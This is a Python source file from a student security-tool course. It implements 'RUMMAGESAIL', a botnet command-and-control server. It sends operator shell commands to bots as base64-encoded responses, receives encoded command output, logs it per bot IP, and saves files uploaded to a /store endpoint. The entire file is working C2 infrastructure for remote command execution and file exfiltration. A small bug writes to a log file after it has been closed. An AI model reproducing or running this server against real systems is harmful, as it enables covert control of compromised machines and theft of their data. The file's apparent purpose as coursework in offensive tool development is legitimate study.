# Student: Anthony Rizi
# DSU Class CSC842 Security Tool Development
# Professor Welu
# This program RUMMAGESAIL establishes a server-client connection and executes base64 encoded commands to decode information sent from the client.

import os
import cgi
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from datetime import datetime
import base64

# Read server IP, port, bot IP, and file location from user input
hostIP = input("Enter the server IP (default: 127.0.0.1): ") or "127.0.0.1"
serverPort = input("Enter the server port (default: 80): ") or 80
serverPort = int(serverPort)
botIP = input("Enter the Client IP address (default: 127.0.0.1): ") or "127.0.0.1"
fileLocation = input("Enter the file location (default: /home/ubuntu/Desktop/): ") or "/home/ubuntu/Desktop/"
botIP = botIP.replace(".", "_")

# Prompt for the encode_input value
encode_input = input("Encode send_command? (yes/no) [default: y]: ").lower() or "y"

# Define the server class
class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        # Display menu options for the server commands
        print("(Ctrl+C) to Return to Menu")

        # Determine if the send_command should be encoded in base64
        encode_send_command = encode_input == 'y'

        # Get the command input from the user
        send_command = input("Bot_Server_Shell> ")

        if encode_send_command:
            # Encode the send_command in base64
            message_bytes = send_command.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')
            print("base64_message: ", base64_message)

            response = base64_message
            print("sending response", response)
        else:
            response = send_command

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(response.encode())

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])

        commandx = self.rfile.read(length).decode()  # Read the command from the request body
        print("do_POST_command client base64 results: ", commandx)

        # Decode the command
        base64_bytes = commandx.encode('ascii')
        message_bytes = base64.b64decode(base64_bytes)
        commandsave = message_bytes.decode('ascii')
        print("commandx printed in clear: ", commandsave)

        # Create a unique file name based on the current datetime
        current_datetime = datetime.now().strftime("%Y%m%d%H%M%S")
        file_name = f"{botIP}_{current_datetime}_results.txt"
        file_path = os.path.join(fileLocation, file_name)

        os.makedirs(os.path.dirname(file_path), exist_ok=True)

        # Write the command results to the file
        with open(file_path, 'w') as result_file:
            result_file.write("Command Results:\n")
            result_file.write(commandsave + "\n\n")
            result_file.write("Uploaded File:\n")

        # Save the uploaded file if the path is '/store'
        if self.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(self.headers.get('Content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
                else:
                    print("[-] Unexpected POST request")
                    return

                if 'file' in fs:
                    fs_up = fs['file']
                    file_path = os.path.join(fileLocation, fs_up.filename)

                    with open(file_path, 'wb') as uploaded_file:
                        uploaded_file.write(fs_up.file.read())

                    result_file.write(fs_up.filename + "\n")
                    print("Uploaded file saved successfully:", file_path)
                else:
                    print("[-] No file uploaded")

            except Exception as e:
                print("An exception occurred:", e)
                self.send_response(500)
                self.end_headers()

        print("Results saved successfully:", file_path)

        return


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


if __name__ == "__main__":
    # Create and start the HTTP server
    webServer = ThreadedHTTPServer((hostIP, serverPort), MyServer)
    print(f"Botnet Server started at http://{hostIP}:{serverPort}")

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        print('[!] Server terminated by user')
        webServer.server_close()

    print("Server stopped.")
